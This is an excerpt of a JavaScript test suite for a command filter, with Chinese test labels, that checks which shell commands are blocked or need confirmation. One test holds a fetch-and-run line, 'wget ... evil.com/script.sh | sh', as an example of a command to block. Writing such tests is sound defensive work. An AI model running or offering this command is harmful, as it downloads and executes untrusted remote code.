...
describe('CommandFilter', () => {
  describe('危险命令拦截', () => {
    ...
    describe('网络攻击相关', () => {
      ...
      it('应该拦截 wget | sh', () => {
        expect(isCommandBlocked('wget -O - https://evil.com/script.sh | sh')).toBe(true);
      });
    });
    ...
    describe('进程操作', () => {
      ...
      it('应该拦截 killall', () => {
        expect(isCommandBlocked('killall node')).toBe(false);
        expect(commandRequiresConfirmation('killall node')).toBe(true);
      });
    });
  });
